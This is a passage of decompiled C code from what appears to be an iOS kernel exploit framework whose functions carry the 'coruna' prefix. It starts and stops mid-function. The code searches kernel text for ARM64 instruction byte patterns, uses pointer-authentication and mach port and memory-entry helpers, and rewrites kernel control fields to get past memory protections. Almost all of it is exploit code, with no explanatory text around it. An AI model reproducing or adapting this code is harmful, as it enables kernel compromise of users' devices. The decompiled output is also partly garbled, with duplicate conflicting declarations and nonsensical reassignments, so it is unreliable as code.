          handle = coruna_kernel5_residual_272(handle,addr,tag,bootargs & 0xffffffffc000);
          handle = handle + (arg >> 0xb & 0x3ff8);
          err = coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state_3(handle,handle,8,&bootargs,val);
          err = false;
          {
            if (err) {
            addr = 0;
            do {
            if (*(long *)(handle + 0x5e8 + addr) == 0) {
            handle = handle + addr;
            handle = addr_2[1];
            addr = *addr_2;
            base = addr_2[3];
            off = addr_2[2];
            *(long *)(handle + 0x608) = addr_2[4];
            *(long *)(handle + 0x5f0) = handle;
            *(long *)(handle + 0x5e8) = addr;
            *(long *)(handle + 0x600) = base;
            *(long *)(handle + 0x5f8) = off;
            return;
            }
            addr = addr + 0x28;
            } while (addr != 0x280);
            }
            return;
          }
          if ((~(uint)bootargs & 3) != 0) goto done;
          size = 3;
          u = 0x4000;
          port = 0xffffffffffffc000;
        }
        *addr_2 = handle;
        {
          addr_2[1] = port & arg;
          *(uint32_t *)(addr_2 + 2) = u;
          *(uint8_t *)((long)addr_2 + 0x14) = size;
          addr_2[4] = bootargs;
          version = 3;
          if ((bootargs & 0x80) != 0) {
          version = 1;
          }
          *(uint *)(addr_2 + 3) = ((uint)(bootargs >> 0x33) & 4 | version) ^ 4;
          err = true;
          {
          if (err) {
          addr = 0;
          do {
          if (*(long *)(handle + 0x5e8 + addr) == 0) {
          handle = handle + addr;
          handle = addr_2[1];
          addr = *addr_2;
          base = addr_2[3];
          off = addr_2[2];
          *(long *)(handle + 0x608) = addr_2[4];
          *(long *)(handle + 0x5f0) = handle;
          *(long *)(handle + 0x5e8) = addr;
          *(long *)(handle + 0x600) = base;
          *(long *)(handle + 0x5f8) = off;
          return;
          }
          addr = addr + 0x28;
          } while (addr != 0x280);
          }
          return;
          }
        }
      }
    }
  }
done:
  err = false;
fail:
  if (err) {
    addr = 0;
    do {
      if (*(long *)(handle + 0x5e8 + addr) == 0) {
        handle = handle + addr;
        handle = addr_2[1];
        addr = *addr_2;
        base = addr_2[3];
        off = addr_2[2];
        *(long *)(handle + 0x608) = addr_2[4];
        *(long *)(handle + 0x5f0) = handle;
        *(long *)(handle + 0x5e8) = addr;
        *(long *)(handle + 0x600) = base;
        *(long *)(handle + 0x5f8) = off;
        return;
      }
      addr = addr + 0x28;
    } while (addr != 0x280);
  }
  return;
}
void coruna_kernel5_via_kernel5_via_pacia_12_6(void)
{
  coruna_kernel5_via_pacia_12_6();
  return;
}
void coruna_kernel5_via_pacia_16(void)
{
  uint64_t u;
  
  u = coruna_pacia_16();
  coruna_helper_5d2c_32264(u,0);
  return;
}
void coruna_kernel5_residual_240(uint64_t val,uint64_t *id_2)
{
  if (id_2 != (uint64_t *)0x0) {
    if ((void *)id_2[3] != (void *)0x0) {
      _free((void *)id_2[3]);
    }
    id_2[1] = 0;
    *id_2 = 0;
    id_2[3] = 0;
    id_2[2] = 0;
    _free(id_2);
    return;
  }
  return;
}
void coruna_kernel5_str_00_e4_00_20_01_00_ad_5f_01_00_f9(long handle,uint64_t *val)
{
  uint *ptr;
  void **lppv2;
  char *ptr;
  uint u;
  uint size;
  uint version;
  void *ptr;
  int err;
  int status;
  uint64_t *buf;
  void *buf;
  void *str;
  long handle;
  uint64_t port;
  void *copy;
  uint tag;
  unsigned long kind;
  void *data;
  unsigned long type_id;
  uint64_t type_id_8;
  uint64_t type_id_9;
  void *scratch;
  int bootargs;
  uint32_t scratch;
  long thread_attr;
  void *host_info;
  long serial_buf;
  long action;
  long block_ctx;
  long stack_guard;
  uint32_t sa_saved;
  uint32_t bootargs;
  uint32_t sa_new;
  uint32_t thread_attr;
  uint32_t host_info;
  uint serial_buf;
  void *path_buf;
  long tmp_buf;
  long region;
  uint32_t action;
  uint32_t block_ctx;
  uint32_t plist;
  uint32_t stack_guard;
  uint32_t sa_saved;
  uint url_buf;
  long json_buf;
  
  json_buf = *(long *)k_kernel_stack_chk_guard_slot;
  buf = _calloc(0x20,1);
  if (!(buf == (uint64_t *)0x0)) {
    data = *(void **)(handle + 0x208);
    if (data == (void *)0x0) {
    buf = *(void **)(&k_kernel_slot_1998 + handle);
    if (buf == (void *)0x0) {
    str = (void *)0x0;
    if (*(long *)(&k_kernel_slot_19f8 + handle) != 0) {
    if (*(unsigned long *)(handle + 0x158) >> 0x2b < 1099) {
    coruna_find_ppltext_2c0e8(&host_info,handle);
    ptr = "0B 05 40 F9 6C 11 40 39";
    if (*(unsigned long *)(handle + 0x158) < 0x1f541e00000000) {
    ptr = "0A 05 40 F9 2B 11 40 39";
    }
    tmp_buf = serial_buf;
    path_buf = host_info;
    region = action;
    str = (void *)coruna_strsep(&path_buf,ptr,0,1);
    if (str == (void *)0x0) goto done;
    if (0x1c1b0002dfffff < *(unsigned long *)(handle + 0x158)) {
    type_id = (long)str - 0x40;
    kind = (long)str - 4;
    data = str;
    while (type_id <= kind) {
    buf = (void *)((long)data + -4);
    str = (void *)coruna_kernel5_via_kernel5_via_pacia_4_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),buf);
    if (((uint)str & 0x9f000000) == 0x90000000) {
    str = (void *)coruna_kernel5_via_kernel5_via_pacia_4_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),data);
    if (((uint)str & 0xbfc00000) == 0xb9400000) {
    cleanup:
    port = *(uint64_t *)(&k_kernel_slot_19f8 + handle);
    goto check_ok;
    }
    }
    else if (((uint)str == 0xd503201f) &&
    (str = (void *)coruna_kernel5_via_kernel5_via_pacia_4_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),
    data),
    ((uint)((unsigned long)str >> 0x18) & 0xff) == 0x58)) goto cleanup;
    kind = (long)data - 8;
    data = buf;
    }
    goto done;
    }
    port = *(uint64_t *)(&k_kernel_slot_19f8 + handle);
    if (*(unsigned long *)(handle + 0x158) < 0x18091980200000) {
    buf = (void *)((long)str + -0x10);
    }
    else {
    buf = (void *)((long)str + -0x1c);
    }
    check_ok:
    str = (void *)coruna_ret_stub_4(port,buf);
    skip:
    buf = str;
    if (str != (void *)0x0) {
    *(void **)(&k_kernel_slot_1998 + handle) = str;
    }
    }
    else {
    coruna_macho_text_sect(&path_buf);
    status = coruna_pacia_12(handle,0x20);
    if (status == 0) {
    if (*(int *)(handle + 0x140) < 0x2712) {
    ptr = "00 E4 00 .. 20 01 00 AD .. .. .. .. 5F 01 00 F9";
    if (*(int *)(handle + 0x140) < 0x225c) {
    ptr = "3F 7D 01 A9 .. .. .. .. 5F 01 00 F9";
    }
    serial_buf = tmp_buf;
    host_info = path_buf;
    action = region;
    handle = coruna_strsep(&host_info,ptr,0,1);
    str = (void *)0x0;
    if (handle != 0) {
    handle = coruna_ret_stub_4(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0xc);
    str = (void *)0x0;
    if (handle != 0) {
    port = *(uint64_t *)(&k_kernel_slot_19f8 + handle);
    goto next;
    }
    }
    }
    else {
    serial_buf = tmp_buf;
    host_info = path_buf;
    action = region;
    handle = coruna_strsep(&host_info,
    "E0 03 13 AA 01 00 80 52 02 05 80 52 .. .. .. .. E0 03",0,1);
    str = (void *)0x0;
    if (handle != 0) {
    handle = coruna_ret_stub_4(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0x14);
    str = (void *)0x0;
    if (handle != 0) {
    port = *(uint64_t *)(&k_kernel_slot_19f8 + handle);
    handle = handle + *(int *)(handle + 0x168);
    next:
    str = (void *)coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4_3(port,handle);
    goto skip;
    }
    }
    }
    }
    else {
    data = *(void **)(&k_kernel_slot_1d38 + handle);
    if (data == (void *)0x0) {
    str = (void *)coruna_pacia_12(handle,0x20);
    if (((int)str != 0) &&
    (kind = *(unsigned long *)(*(long *)(handle + 0x118) + 0x148), kind != 0)) {
    bootargs = 0;
    kind = kind & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff);
    do {
    kind = kind - *(uint *)(handle + 0x180);
    str = (void *)coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state(handle,kind,&bootargs);
    if ((int)str == 0) goto done;
    } while (bootargs != -0x1120531);
    if (kind != 0) {
    data = _calloc(0x128,1);
    str = (void *)0x0;
    if (data != (void *)0x0) {
    coruna_ctx_clear_12bc4(data,handle);
    port = *(uint64_t *)(handle + 0x140);
    type_id_9 = *(uint64_t *)(handle + 0x158);
    type_id_8 = *(uint64_t *)(handle + 0x150);
    *(uint64_t *)((long)data + 0x78) = *(uint64_t *)(handle + 0x148);
    *(uint64_t *)((long)data + 0x70) = port;
    *(uint64_t *)((long)data + 0x88) = type_id_9;
    *(uint64_t *)((long)data + 0x80) = type_id_8;
    *(uint64_t *)((long)data + 0x90) = *(uint64_t *)(handle + 0x160);
    *(uint32_t *)((long)data + 0x98) = *(uint32_t *)(handle + 0x178);
    *(uint32_t *)((long)data + 0x38) = *(uint32_t *)(handle + 0x180);
    str = (void *)coruna_call_return_zero_61a8(data,0,kind,0);
    if ((int)str != 0) {
    *(void **)(&k_kernel_slot_1d38 + handle) = data;
    goto retry;
    }
    }
    }
    }
    }
    else {
    retry:
    coruna_macho_text_sect(&host_info,data);
    handle = coruna_strsep(&host_info,
    "1F 20 03 D5 .. .. .. .. .. .. .. .. .. .. .. .. 08 05 00 51 1F F9 03 71"
    ,0,1);
    str = (void *)0x0;
    if (handle != 0) {
    handle = coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4_2_2(*(uint64_t *)(&k_kernel_slot_1d38 + handle),handle + -4,0);
    str = (void *)0x0;
    if (handle != 0) {
    handle = coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4_3(*(uint64_t *)(&k_kernel_slot_1d38 + handle),handle + 0x20);
    str = (void *)0x0;
    if (handle != 0) {
    port = *(uint64_t *)(&k_kernel_slot_1d38 + handle);
    goto next;
    }
    }
    }
    }
    }
    done:
    buf = (void *)0x0;
    }
    if (buf != (void *)0x0) goto found;
    }
    }
    else {
    found:
    status = 0x2800f;
    str = (void *)coruna_kernel5_residual_257(handle,buf,&scratch);
    if ((int)str == 0) {
    nomem:
    data = (void *)0x0;
    }
    else {
    data = buf;
    if (scratch == (void *)0x0) {
    invalid:
    tag = 0x40;
    lppv2 = &host_info;
    if (*(unsigned long *)(handle + 0x158) >> 0x2b < 1099) {
    tag = 0x30;
    lppv2 = &path_buf;
    }
    size = tag | 0x5800;
    u = *(uint *)(handle + 0x180);
    version = 0;
    if (u != 0) {
    version = size / u;
    }
    err = size - version * u;
    status = 0;
    if (err != 0) {
    status = u - err;
    }
    scratch = (void *)coruna_u64_pack((scratch), (status + size));
    copy = (void *)coruna_mach_port_request_notification_29a50(handle,&scratch);
    if (copy == (void *)0x0) {
    status = 0xad009;
    str = (void *)0x0;
    }
    else {
    if (*(unsigned long *)(handle + 0x158) < 0x22580000000000) {
    err = coruna_kernel5_residual_257(handle,buf,&bootargs);
    status = 0x2800f;
    if (err != 0) {
    status = 0;
    path_buf = (void *)coruna_u64_pack((scratch), (bootargs));
    tmp_buf = (long)copy + 0x18;
    region = ((unsigned long)scratch & 0xffffffff) - 0x18;
    url_buf = 0;
    action = 1;
    stack_guard = (uint32_t)k_kernel_rodata_word_00033708;
    sa_saved = (uint32_t)((unsigned long)k_kernel_rodata_word_00033708 >> 0x20);
    block_ctx = (uint32_t)k_kernel_rodata_word_33700;
    plist = (uint32_t)((unsigned long)k_kernel_rodata_word_33700 >> 0x20);
    }
    }
    else {
    err = coruna_kernel5_residual_257(handle,buf,&bootargs);
    status = 0x2800f;
    if (err != 0) {
    status = 0;
    host_info = (void *)coruna_u64_pack((scratch), (bootargs));
    action = k_kernel_rodata_word_000336f8;
    serial_buf = k_kernel_rodata_word_336f0;
    block_ctx = ((unsigned long)scratch & 0xffffffff) - 0x28;
    stack_guard = (long)copy + 0x28;
    sa_saved = 1;
    serial_buf = 0;
    thread_attr = (uint32_t)k_kernel_rodata_word_00033708;
    host_info = (uint32_t)((unsigned long)k_kernel_rodata_word_00033708 >> 0x20);
    bootargs = (uint32_t)k_kernel_rodata_word_33700;
    sa_new = (uint32_t)((unsigned long)k_kernel_rodata_word_33700 >> 0x20);
    }
    }
    if (status == 0) {
    status = coruna_ret_stub_7(handle,copy,lppv2,tag);
    if (status != 0) {
    status = coruna_pacia_12(handle,0x5184001);
    if (status == 0) {
    str = (void *)coruna_call_mach_vm_machine_attribute_1d4f8(handle,buf,copy);
    status = (int)str;
    }
    else {
    str = (void *)coruna_kernel5_via_kernel5_via_semaphore_timedwait_2(handle,buf,copy);
    status = (int)str;
    }
    if (status != 0) {
    status = 0;
    data = copy;
    goto again;
    }
    }
    status = 0x28010;
    }
    str = (void *)coruna_mach_port_allocate(handle,copy,(unsigned long)scratch & 0xffffffff);
    }
    }
    else {
    handle = coruna_pacia(handle);
    copy = scratch;
    if (handle == 0) {
    status = 0x28011;
    str = (void *)0x0;
    data = (void *)0x0;
    }
    else {
    do {
    ptr = copy;
    scratch = ptr;
    if (ptr == (void *)0x0) goto invalid;
    if (*(unsigned long *)(handle + 0x158) < 0x22580000000000) {
    str = (void *)coruna_ret_stub_6(handle,ptr,0x30,&host_info);
    if ((int)str == 0) goto nomem;
    str = (void *)coruna_ret_stub_6(handle,serial_buf + 4,0x10,&bootargs);
    err = (int)str;
    copy = host_info;
    }
    else {
    str = (void *)coruna_ret_stub_6(handle,ptr,0x28,&path_buf);
    if ((int)str == 0) goto nomem;
    str = (void *)coruna_ret_stub_6(handle,coruna_u64_pack((stack_guard), (plist)) + 4,0x10,
    &bootargs);
    err = (int)str;
    copy = path_buf;
    }
    if (err == 0) goto nomem;
    data = ptr;
    } while (coruna_u64_pack((scratch), (bootargs)) != 0x403020100 || thread_attr != 0);
    if (scratch == (void *)0x0) goto invalid;
    status = 0;
    data = scratch;
    }
    }
    }
    again:
    if (status == 0) {
    *(void **)(handle + 0x208) = data;
    {
      *buf = data;
      buf[1] = k_kernel_rodata_word_33710;
      buf = _calloc(0x5800,1);
      str = buf;
      if (buf != (void *)0x0) {
      buf[3] = buf;
      action = 0;
      block_ctx = 0;
      region = 0;
      sa_saved = 0;
      url_buf = 0;
      plist = 0;
      stack_guard = 0;
      host_info = 0;
      serial_buf = 0;
      sa_new = 0;
      thread_attr = 0;
      tmp_buf = 0;
      path_buf = (void *)0x0;
      block_ctx = 0;
      action = 0;
      sa_saved = 0;
      bootargs = 0;
      stack_guard = 0;
      serial_buf = 0;
      host_info = (void *)0x0;
      if (data != (void *)0x0) {
      kind = *(unsigned long *)(handle + 0x158) >> 0x2b;
      lppv2 = &host_info;
      if (kind < 1099) {
      lppv2 = &path_buf;
      }
      handle = 0x40;
      if (kind < 1099) {
      handle = 0x30;
      }
      str = (void *)coruna_ret_stub_6(handle,data,handle,lppv2);
      if ((int)str != 0) {
      ptr = &serial_buf;
      if (*(unsigned long *)(handle + 0x158) < 0x22580000000000) {
      ptr = &url_buf;
      }
      tag = *ptr;
      if ((tag < 0x400) &&
      ((*(uint *)(buf + 2) = tag, tag == 0 ||
      (str = (void *)coruna_ret_stub_6(handle,(long)data + handle,tag * 0x16,buf),
      (int)str != 0)))) {
      *val = buf;
      {
      if (*(long *)k_kernel_stack_chk_guard_slot != json_buf) {
      ___stack_chk_fail();
      }
      return;
      }
      }
      }
      }
      }
    }
    }
    }
    }
    else {
    exit_ok:
    *buf = data;
    buf[1] = k_kernel_rodata_word_33710;
    buf = _calloc(0x5800,1);
    str = buf;
    if (buf != (void *)0x0) {
    buf[3] = buf;
    action = 0;
    block_ctx = 0;
    region = 0;
    sa_saved = 0;
    url_buf = 0;
    plist = 0;
    stack_guard = 0;
    host_info = 0;
    serial_buf = 0;
    sa_new = 0;
    thread_attr = 0;
    tmp_buf = 0;
    path_buf = (void *)0x0;
    block_ctx = 0;
    action = 0;
    sa_saved = 0;
    bootargs = 0;
    stack_guard = 0;
    serial_buf = 0;
    host_info = (void *)0x0;
    if (data != (void *)0x0) {
    kind = *(unsigned long *)(handle + 0x158) >> 0x2b;
    lppv2 = &host_info;
    if (kind < 1099) {
    lppv2 = &path_buf;
    }
    handle = 0x40;
    if (kind < 1099) {
    handle = 0x30;
    }
    str = (void *)coruna_ret_stub_6(handle,data,handle,lppv2);
    if ((int)str != 0) {
    ptr = &serial_buf;
    if (*(unsigned long *)(handle + 0x158) < 0x22580000000000) {
    ptr = &url_buf;
    }
    tag = *ptr;
    if ((tag < 0x400) &&
    ((*(uint *)(buf + 2) = tag, tag == 0 ||
    (str = (void *)coruna_ret_stub_6(handle,(long)data + handle,tag * 0x16,buf),
    (int)str != 0)))) {
    *val = buf;
    {
      if (*(long *)k_kernel_stack_chk_guard_slot != json_buf) {
      ___stack_chk_fail();
      }
      return;
    }
    }
    }
    }
    }
    }
    coruna_kernel5_residual_240(str,buf);
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != json_buf) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_kernel5_residual_241(uint64_t val,long handle,void *ctx,uint size)
{
  int err;
  int status;
  unsigned long u;
  long handle;
  unsigned long size;
  
  if ((((handle != 0) && (handle = *(long *)(handle + 0x18), handle != 0)) &&
      (u = (unsigned long)*(uint *)(handle + 0x10), *(uint *)(handle + 0x10) != 0)) &&
     (*(uint *)(handle + 8) == size)) {
    size = 0;
    err = *(int *)(handle + 0xc);
    do {
      u = u - 1;
      status = _memcmp((void *)(handle + size),ctx,(unsigned long)size);
      size = (unsigned long)((int)size + err + size);
    } while (status != 0 && u != 0);
  }
  return;
}
void coruna_qsort(uint64_t val,long handle,void *ctx,unsigned long arg)
{
  int err;
  int status;
  uint u;
  unsigned long size;
  int *err;
  void *ptr;
  long handle;
  
  if ((((handle != 0) && (handle = *(long *)(handle + 0x18), handle != 0)) &&
      (*(int *)(handle + 8) == (int)arg)) &&
     ((size = coruna_kernel5_residual_241(val,handle,ctx,arg), (size & 1) == 0 &&
      (*(uint *)(handle + 0x10) < 0x400)))) {
    ptr = (void *)(handle + (unsigned long)((*(int *)(handle + 0xc) + (int)arg) *
                                     *(uint *)(handle + 0x10)));
    _memcpy(ptr,ctx,arg & 0xffffffff);
    *(int *)(handle + 0x10) = *(int *)(handle + 0x10) + 1;
    if (*(int *)(handle + 0xc) == 2) {
      *(uint8_t *)((long)ptr + (unsigned long)*(uint *)(handle + 8)) = 2;
      *(uint8_t *)((long)ptr + (unsigned long)(*(int *)(handle + 8) + 1)) = 0;
    }
    ptr = *(void **)(handle + 0x18);
    if ((ptr != (void *)0x0) && (u = *(uint *)(handle + 0x10), u != 0)) {
      err = *(int *)(handle + 8);
      status = *(int *)(handle + 0xc);
      err = (int *)coruna_kernel5_via_pacia_16(coruna_kernel5_residual_242);
      _qsort(ptr,(unsigned long)u,(unsigned long)(uint)(status + err),err);
    }
  }
  return;
}
void coruna_kernel5_via_mach_vm_machine_attribute(long handle,long *addr_2)
{
  long handle;
  int err;
  unsigned long u;
  
  if (((addr_2 != (long *)0x0) && (addr_2[3] != 0)) && (*addr_2 != 0)) {
    u = *(unsigned long *)(handle + 0x158) >> 0x2b;
    handle = 0x40;
    if (u < 1099) {
      handle = 0x30;
    }
    err = coruna_ret_stub_7(handle,handle + *addr_2,addr_2[3],
                         (*(int *)((long)addr_2 + 0xc) + (int)addr_2[1]) * (int)addr_2[2]);
    if (err != 0) {
      handle = 0x3c;
      if (u < 1099) {
        handle = 0x2c;
      }
      coruna_mach_vm_machine_attribute(handle,*addr_2 + handle,(int)addr_2[2]);
    }
  }
  return;
}
void coruna_kernel5_via_qsort(uint64_t val,uint size,int flags,long handle)
{
  uint64_t u;
  uint64_t size;
  unsigned long version;
  uint64_t scratch;
  
  scratch = 0;
  if ((flags == 0x14) &&
     (size = coruna_kernel5_str_00_e4_00_20_01_00_ad_5f_01_00_f9(val,&scratch), u = scratch, (int)size == 0)) {
    if (size != 0) {
      version = 0;
      do {
        size = coruna_qsort(size,u,handle + (version & 0xfffffffc),0x14);
        if ((int)size != 0) goto fail;
        version = version + 0x14;
      } while ((unsigned long)size * 0x14 - version != 0);
    }
    size = coruna_kernel5_via_mach_vm_machine_attribute(val,u);
fail:
    coruna_kernel5_residual_240(size,u);
  }
  return;
}
void coruna_kernel5_via_kernel5_via_qsort(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_kernel5_via_qsort(val,1,size_3,id_2);
  return;
}
void coruna_kernel5_residual_242(long handle,long addr_2)
{
  long handle;
  
  handle = 0;
  while( true ) {
    if (*(byte *)(handle + handle) < *(byte *)(addr_2 + handle)) {
      return;
    }
    if (*(byte *)(addr_2 + handle) < *(byte *)(handle + handle)) break;
    handle = handle + 1;
    if (handle == 0x14) {
      return;
    }
  }
  return;
}
void coruna_pacia_3(void)
{
  return;
}
void coruna_kernel5_via_pacia_12_7(uint64_t val,unsigned long arg,int flags)
{
  uint u;
  bool err;
  long handle;
  int err;
  int status;
  int flags;
  int count;
  unsigned long size;
  long *ptr;
  long addr;
  unsigned long version;
  uint port;
  unsigned long tag;
  uint16_t *ptr;
  long off;
  unsigned long kind;
  uint64_t type_id;
  uint64_t type_id_8;
  unsigned long type_id_9;
  uint type_id_10;
  unsigned long type_id_11;
  unsigned long type_id_12;
  uint64_t scratch;
  uint64_t *bootargs;
  uint8_t thread_attr[64];
  long host_info [7];
  long serial_buf [7];
  uint64_t action;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t block_ctx;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t stack_guard[4];
  uint64_t sa_saved;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t path_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  long tmp_buf;
  
  tmp_buf = *(long *)k_kernel_stack_chk_guard_slot;
  err = coruna_pacia_12(val,0x2200000);
  tag = 0x206000000;
  if (err != 0) {
    tag = 0x406000000;
  }
  status = coruna_pacia_12(val,0x2200000);
  err = 0xe;
  if (status != 0) {
    err = 0xf;
  }
  status = coruna_pacia_12(val,0x1000000);
  if (status == 0) {
    status = coruna_pacia_12(val,0x2200000);
    type_id_11 = 0x3fffff;
    if (status != 0) {
      type_id_11 = 0x3ffffff;
    }
  }
  else {
    type_id_11 = 0x7ffffff;
  }
  status = coruna_mach_absolute_time_18864(val,1);
  if (status != 0) {
    status = coruna_mach_absolute_time_18960(val);
    if ((status == 0) && (status = coruna_mach_make_memory_entry_2aed0(val,tag | 0x140000,host_info), status == 0)) {
      status = coruna_mach_make_memory_entry_2aed0(val,tag | 0x150000,serial_buf);
      if (status == 0) {
        status = coruna_kernel5_via_mach_port_deallocate_2b24c(val,tag,thread_attr);
        handle = serial_buf[0];
        if (status != 0) {
          tag = *(unsigned long *)(host_info[0] + 0x108);
          type_id = *(uint64_t *)(serial_buf[0] + 0x40);
          type_id_8 = *(uint64_t *)(serial_buf[0] + 0x48);
          status = coruna_pacia_12(val,0x1100000);
          if (status == 0) {
            scratch = 0;
            bootargs = (uint64_t *)0x0;
          }
          else {
            bootargs = (uint64_t *)(serial_buf[0] + 0x20);
            scratch = *bootargs;
            *bootargs = 1;
          }
          size = coruna_kernel5_via_kernel5_via_kernel5_via_pacia_12_6(val);
          if (size == 0) {
            err = false;
          }
          else {
            kind = arg & 0x3f;
            status = 0;
            do {
              flags = coruna_ret_stub_6(val,arg & 0xffffffffffffffc0,0x40,&action);
              if (flags == 0) break;
              if (status == 0) {
fail:
                sa_new = scratch;
                sa_new = action;
                tmp_buf = thread_attr;
                path_buf = bootargs;
                region = host_info;
                path_buf = block_ctx;
                url_buf = action;
                plist = serial_buf;
                stack_guard[1] = scratch;
                stack_guard[0] = action;
                stack_guard[3] = thread_attr;
                stack_guard[2] = bootargs;
                block_ctx = host_info;
                sa_saved = block_ctx;
                sa_saved = action;
                stack_guard = serial_buf;
                *(int *)((long)stack_guard + kind) = flags;
              }
              else {
                flags = _memcmp(&sa_new,&action,0x40);
                if (flags != 0) {
                  flags = _memcmp(&action,stack_guard,0x40);
                  if ((flags != 0) && (*(int *)((long)&action + kind) != flags))
                  goto fail;
                  err = false;
                  goto done;
                }
              }
              flags = coruna_mach_absolute_time_18cfc(val,thread_attr);
              if (flags == 0) break;
              *(unsigned long *)(host_info[0] + 0x108) =
                   *(unsigned long *)(host_info[0] + 0x108) | 0x8000000000000001;
              while ((~*(unsigned long *)(host_info[0] + 0x108) & 0x8000000000000001) != 0) {
                coruna_semaphore_timedwait(val,100);
              }
              *(unsigned long *)(host_info[0] + 8) = *(unsigned long *)(host_info[0] + 8) & 0xefffffffffffffff;
              *(unsigned long *)(host_info[0] + 0x108) =
                   *(unsigned long *)(host_info[0] + 0x108) & (tag | 0x8000000000000000);
              while ((*(unsigned long *)(host_info[0] + 0x108) & 0x8000000000000001) != 0) {
                coruna_semaphore_timedwait(val,100);
              }
              addr = 0;
              *(unsigned long *)(handle + 0x40) =
                   (unsigned long)((-1 << err & 0x4000U ^ 0x7fc0) & (uint)size | 0x2000000);
              do {
                *(uint64_t *)(handle + 0x48) = *(uint64_t *)((long)stack_guard + addr);
                addr = addr + 8;
              } while (addr != 0x40);
              addr = 0;
              type_id_12 = 0;
              ptr = &k_kernel_rodata_word_33718;
              do {
                off = 0;
                do {
                  if ((*(uint *)((long)stack_guard + addr * 4) >> (unsigned long)((uint)off & 0x1f) & 1)
                      != 0) {
                    type_id_12 = (unsigned long)((uint)(ushort)ptr[off] ^ (uint)type_id_12);
                  }
                  off = off + 1;
                } while (off != 0x20);
                addr = addr + 1;
                ptr = ptr + 0x20;
              } while (addr != 8);
              addr = 0;
              type_id_9 = 0;
              ptr = &k_kernel_rodata_word_33718;
              do {
                off = 0;
                do {
                  if ((*(uint *)((long)&sa_saved + addr * 4) >> (unsigned long)((uint)off & 0x1f) & 1)
                      != 0) {
                    type_id_9 = (unsigned long)((uint)(ushort)ptr[off] ^ (uint)type_id_9);
                  }
                  off = off + 1;
                } while (off != 0x20);
                addr = addr + 1;
                ptr = ptr + 0x20;
              } while (addr != 8);
              flags = coruna_pacia_12(val,0x84001);
              count = coruna_pacia_12(val,0x2200000);
              if (count != 0) {
                type_id_10 = (uint)type_id_12;
                version = size >> 0x25 & 0x1f | (unsigned long)(type_id_10 & 0x3e0);
                if ((uint)version != type_id_10) {
                  port = 10;
                  do {
                    u = ((uint)version ^ type_id_10) & 0xffff;
                    u = u ^ u >> 8;
                    u = u ^ u >> 4;
                    u = u ^ u >> 2;
                    type_id_12 = version;
                    if (((u ^ u >> 1) & 1) == 0) break;
                    port = port - 1;
                    version = (unsigned long)((uint)version ^ 1 << (unsigned long)(port & 0x1f));
                    type_id_12 = version;
                  } while (5 < port);
                }
              }
              addr = 8;
              if (flags != 0) {
                addr = 0x28;
              }
              *(unsigned long *)(handle + 0x48) =
                   (size >> err & type_id_11) << 0x12 | type_id_9 << 0x32 | (type_id_12 & 0xffff) << addr
                   | 0x1f;
              *(unsigned long *)(host_info[0] + 0x108) =
                   *(unsigned long *)(host_info[0] + 0x108) | 0x8000000000000001;
              while ((~*(unsigned long *)(host_info[0] + 0x108) & 0x8000000000000001) != 0) {
                coruna_semaphore_timedwait(val,100);
              }
              *(unsigned long *)(host_info[0] + 8) = *(unsigned long *)(host_info[0] + 8) | 0x1000000000000000;
              flags = coruna_ret_stub_6(val,arg,4,(long)&action + kind);
              if ((flags == 0) || (*(int *)((long)&action + kind) == flags)) {
cleanup:
                err = true;
                goto done;
              }
              *(unsigned long *)(host_info[0] + 0x108) =
                   *(unsigned long *)(host_info[0] + 0x108) & (tag | 0x8000000000000000);
              while ((*(unsigned long *)(host_info[0] + 0x108) & 0x8000000000000001) != 0) {
                coruna_semaphore_timedwait(val,100);
              }
              type_id_12 = coruna_mach_absolute_time_2045c(val,thread_attr);
              if ((type_id_12 & 1) == 0) goto cleanup;
              status = status + 1;
            } while (status != 0x10);
            err = false;
          }
done:
          if ((tag != 0) && (*(unsigned long *)(host_info[0] + 0x108) != tag)) {
            *(unsigned long *)(host_info[0] + 0x108) =
                 *(unsigned long *)(host_info[0] + 0x108) & (tag | 0x8000000000000000);
          }
          *(uint64_t *)(handle + 0x40) = type_id;
          *(uint64_t *)(handle + 0x48) = type_id_8;
          err = coruna_pacia_12(val,0x1100000);
          if (err != 0) {
            *bootargs = scratch;
          }
          if (err) {
            coruna_mach_absolute_time_2045c(val,thread_attr);
          }
          coruna_mach_port_deallocate_2b24c(val,thread_attr);
        }
        coruna_mach_port_deallocate_2b24c(val,host_info);
        ptr = serial_buf;
      }
      else {
        ptr = host_info;
      }
      coruna_mach_port_deallocate_2b24c(val,ptr);
    }
    coruna_kernel5_residual_251(val,4);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != tmp_buf) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_mach_absolute_time_18864(long handle,int flags)
{
  unsigned long u;
  int err;
  uint64_t size;
  long handle;
  
  if (flags == 0) {
    coruna_kernel5_residual_251(handle,4);
  }
  else {
    if (((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) &&
       (handle = *(long *)(*(long *)(handle + 0x118) + 0x150), handle != 0)) {
      size = _mach_absolute_time();
      u = 0;
      if ((unsigned long)*(uint *)(handle + 0x260) != 0) {
        u = ((size - handle) * (unsigned long)*(uint *)(handle + 0x25c)) /
                (unsigned long)*(uint *)(handle + 0x260);
      }
      if (u < 20000000) {
        coruna_semaphore_timedwait(handle,(0x14 - (int)((u & 0xffffffff) / 1000000)) * 1000);
      }
    }
    err = coruna_mach_absolute_time_1a9c0(handle,4,1000);
